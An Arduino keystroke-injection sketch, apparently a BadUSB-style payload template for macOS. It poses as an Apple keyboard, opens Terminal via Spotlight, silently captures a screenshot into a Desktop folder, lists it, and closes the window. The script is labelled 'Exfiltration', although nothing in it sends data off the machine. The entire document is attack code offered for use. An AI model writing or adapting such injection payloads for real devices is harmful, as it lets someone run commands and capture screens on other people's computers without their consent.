#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Capture screenshot and save to Desktop
  // Author: Generated
  // Title: Screenshot Capture
  // Target: macOS
  // Version: 1.0
  // Category: Exfiltration
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Desktop/screenshots");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("screencapture -x ~/Desktop/screenshots/screenshot_$(date +%Y%m%d_%H%M%S).png");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("ls -la ~/Desktop/screenshots/");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}